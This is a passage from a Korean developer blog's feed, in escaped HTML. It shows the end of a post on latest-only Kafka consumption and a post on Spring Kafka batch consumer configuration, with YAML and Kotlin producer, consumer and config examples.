&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.global.config.AppConfig&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.global.config.KafkaMessageListenerConfig&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Bean&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.KafkaMessageListenerContainer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.MessageListener&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Service&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserConsumer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;kafkaMessageListenerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaMessageListenerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;appConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AppConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Bean&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;userConsume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaMessageListenerContainer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;container&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kafkaMessageListenerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;createKafkaMessageListenerContainer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;topic&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;groupId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${KafkaConsumerGroupId.USER}-${appConfig.containerId}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;messageListener&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;messageListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
      &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
        
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;messageListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MessageListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MessageListener&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&amp;gt;&lt;/span&gt;  
                    
          &lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;record++&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;컨슈머 그룹 ID에 containerId를 포함시켜 &lt;br /&gt;
새 도커 컨테이너가 참여할 때마다 새로운 컨슈머 그룹으로 컨슈머가 생성된다.&lt;/li&gt;
  &lt;li&gt;@KafkaListener 기반이 아닌 직접 컨테이너를 생성하는 방식이므로, container.start()를 명시적으로 호출해 컨슈머를 시작해야 한다.&lt;/li&gt;
  &lt;li&gt;KafkaMessageListenerContainer를 @Bean으로 등록했기 때문에&lt;br /&gt;
스프링 컨텍스트가 해당 빈의 라이프사이클을 관리하게 된다.&lt;br /&gt;
따라서  스프링이 종료되면 userConsume 객체도 자동으로 종료된다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;참고&quot;&gt;참고&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.spring.io/spring-kafka/reference/kafka/seek.html&quot;&gt;Spring.io - Seeking to a Specific Offset&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.spring.io/spring-kafka/reference/kafka/receiving-messages/message-listener-container.html&quot;&gt;Spring.io - Message Listener Conatiners&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Kafka" /><category term="kafka" /><category term="spring" /><category term="kotlin" /><category term="pubsub" /><summary type="html">설명 Kafka를 Pub/Sub 방식으로 활용하고 싶을 때, 특정 토픽의 가장 최신 메시지만 소비하는 구조가 필요하다. 이 글에서는 Spring Kafka에서 auto-offset-reset: latest와 seekToEnd() 설정을 조합하여, 컨슈머가 파티션에 연결되었을 때 항상 최신 메시지만 소비하도록 설정하는 방법을 소개한다.</summary></entry><entry><title type="html">Spring Kafka 컨슈머 배치 설정</title><link href="https://a3magic3pocket.github.io/posts/spring-kafka-batch-consumer-config/" rel="alternate" type="text/html" title="Spring Kafka 컨슈머 배치 설정" /><published>2025-04-11T22:33:19+09:00</published><updated>2025-04-11T22:33:19+09:00</updated><id>https://a3magic3pocket.github.io/posts/spring-kafka-batch-consumer-config</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/spring-kafka-batch-consumer-config/">&lt;h2 id=&quot;개요&quot;&gt;개요&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;컨슈머에서 폴링 시 배치 단위로 가져오게 할 수 있다.&lt;/li&gt;
  &lt;li&gt;이를 통하여 처리 성능을 높일 수 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;설정&quot;&gt;설정&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;application.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;spring&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;kafka&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;bootstrap-servers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;kafka:9092&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;producer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;key-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringSerializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;value-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.JsonSerializer&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;consumer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;auto-offset-reset&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;latest&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;enable-auto-commit&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;key-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringDeserializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;value-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.JsonDeserializer&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;# | -- 추가 시작 -- |  &lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;max-poll-records&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;20&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;# | -- 추가 끝 -- |  &lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
        &lt;span class=&quot;s&quot;&gt;spring.json.trusted.packages&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;KafkaConfig
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.config&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.apache.kafka.common.TopicPartition&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Bean&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Configuration&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.ConsumerFactory&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.KafkaTemplate&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.ContainerProperties&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.DeadLetterPublishingRecoverer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.DefaultErrorHandler&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.util.backoff.FixedBackOff&lt;/span&gt;  
            
&lt;span class=&quot;nd&quot;&gt;@Configuration&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaConfig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@Bean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;batchKafkaListenerContainerFactory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;batchKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConsumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;factory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;()&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isBatchListener&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;  
            
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;프로듀서
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.producer&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.constant.KafkaTopic&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.KafkaTemplate&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Service&lt;/span&gt;  
            
            
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
            
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;컨슈머
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.consumer&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.constant.KafkaTopic&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.annotation.KafkaListener&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.support.Acknowledgment&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Component&lt;/span&gt;  
            
&lt;span class=&quot;nd&quot;&gt;@Component&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserConsumer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@KafkaListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;topics&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;groupId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;containerFactory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;batchKafkaListenerContainerFactory&quot;&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;consume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        &lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;record++&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;컨트롤러
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.controller&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.producer.UserProducer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;io.swagger.v3.oas.annotations.Operation&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.HttpStatus&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.MediaType&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.ResponseEntity&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.GetMapping&lt;/span&gt;  
